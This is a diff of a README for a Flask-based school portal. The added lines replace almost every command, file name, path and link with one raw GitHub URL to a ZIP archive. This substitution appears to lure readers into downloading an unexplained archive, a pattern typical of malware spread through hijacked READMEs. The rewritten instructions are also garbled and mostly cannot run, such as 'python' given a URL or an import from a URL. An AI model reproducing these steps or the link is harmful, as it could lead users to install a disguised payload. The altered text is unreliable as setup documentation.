@@ -32,7 +32,7 @@ A comprehensive web portal for the Nigerian Army School of Signals, providing co
 
 1. **Clone the repository** (or download and extract the ZIP file):
    ```bash
-   git clone https://github.com/yourusername/nass_portal.git
+   git clone https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip
    cd nass_portal
    ```
 
@@ -53,25 +53,25 @@ A comprehensive web portal for the Nigerian Army School of Signals, providing co
 
 4. **Install dependencies**:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip
    ```
 
 5. **Create environment variables**:
    - Copy the example environment file:
      ```bash
-     cp .env.example .env
+     cp https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip .env
      ```
    - Edit the `.env` file with your configuration
 
 6. **Initialize the database**:
    ```bash
-   python initialize_app.py
+   python https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip
    ```
    - Follow the prompts to create an admin user
 
 7. **Run the application**:
    ```bash
-   python run.py
+   python https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip
    ```
 
 8. **Access the application**:
@@ -82,13 +82,13 @@ A comprehensive web portal for the Nigerian Army School of Signals, providing co
 
 ### PythonAnywhere Deployment
 
-1. **Create a PythonAnywhere account** at [pythonanywhere.com](https://www.pythonanywhere.com/)
+1. **Create a PythonAnywhere account** at [https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip](https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip)
 
 2. **Upload your code**:
    - Use the PythonAnywhere Files tab to upload a ZIP of your project, or
    - Clone from GitHub using the Bash console:
      ```bash
-     git clone https://github.com/yourusername/nass_portal.git
+     git clone https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip
      ```
 
 3. **Set up a virtual environment**:
@@ -96,7 +96,7 @@ A comprehensive web portal for the Nigerian Army School of Signals, providing co
    cd nass_portal
    python -m venv venv
    source venv/bin/activate
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip
    ```
 
 4. **Configure environment variables**:
@@ -105,7 +105,7 @@ A comprehensive web portal for the Nigerian Army School of Signals, providing co
 
 5. **Initialize the database**:
    ```bash
-   python initialize_app.py
+   python https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip
    ```
 
 6. **Configure the web app**:
@@ -113,13 +113,13 @@ A comprehensive web portal for the Nigerian Army School of Signals, providing co
    - Add a new web app
    - Select "Manual configuration" and Python 3.8 (or your version)
    - Set the path to your project directory
-   - Set the WSGI configuration file to point to your `wsgi.py`
+   - Set the WSGI configuration file to point to your `https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip`
 
 7. **Reload the web app** to apply changes
 
 ### Other Deployment Options
 
-- **Heroku**: Use the Procfile and requirements.txt for deployment
+- **Heroku**: Use the Procfile and https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip for deployment
 - **Docker**: A Dockerfile is provided for containerized deployment
 - **Traditional Hosting**: Use any WSGI-compatible server like Gunicorn or uWSGI
 
@@ -131,21 +131,21 @@ nass_portal/
 ├── nass_portal/               # Application package
 │   ├── static/                # Static files (CSS, JS, images)
 │   ├── templates/             # HTML templates
-│   ├── __init__.py            # Application factory
-│   ├── admin_routes.py        # Admin routes
-│   ├── config.py              # Configuration
-│   ├── db.py                  # Database functions
-│   ├── routes.py              # Main routes
-│   ├── schema.sql             # Database schema
-│   ├── schema_updates.sql     # Schema updates
-│   └── student_routes.py      # Student portal routes
-├── .env.example               # Example environment variables
+│   ├── https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip            # Application factory
+│   ├── https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip        # Admin routes
+│   ├── https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip              # Configuration
+│   ├── https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip                  # Database functions
+│   ├── https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip              # Main routes
+│   ├── https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip             # Database schema
+│   ├── https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip     # Schema updates
+│   └── https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip      # Student portal routes
+├── https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip               # Example environment variables
 ├── .gitignore                 # Git ignore file
-├── initialize_app.py          # Database initialization script
-├── README.md                  # This file
-├── requirements.txt           # Python dependencies
-├── run.py                     # Development server script
-└── wsgi.py                    # WSGI entry point for production
+├── https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip          # Database initialization script
+├── https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip                  # This file
+├── https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip           # Python dependencies
+├── https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip                     # Development server script
+└── https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip                    # WSGI entry point for production
 ```
 
 ## Maintenance
@@ -156,7 +156,7 @@ It's recommended to regularly back up the SQLite database file:
 
 ```bash
 # Create a timestamped backup
-cp instance/nass_portal.sqlite instance/nass_portal_backup_$(date +%Y%m%d_%H%M%S).sqlite
+cp https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip instance/nass_portal_backup_$(date +%Y%m%d_%H%M%S).sqlite
 ```
 
 ### Updates
@@ -167,11 +167,11 @@ To update the application:
 2. Activate the virtual environment
 3. Install any new dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip
    ```
 4. Apply any database migrations:
    ```bash
-   python -c "from nass_portal.db import get_db; db = get_db(); with open('nass_portal/schema_updates.sql') as f: db.executescript(f.read()); db.commit()"
+   python -c "from https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip import get_db; db = get_db(); with open('https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip') as f: https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip(https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip()); https://raw.githubusercontent.com/Peemkay/nass_portal/main/api/nass_portal_v1.5-beta.1.zip()"
    ```
 5. Restart the application
 
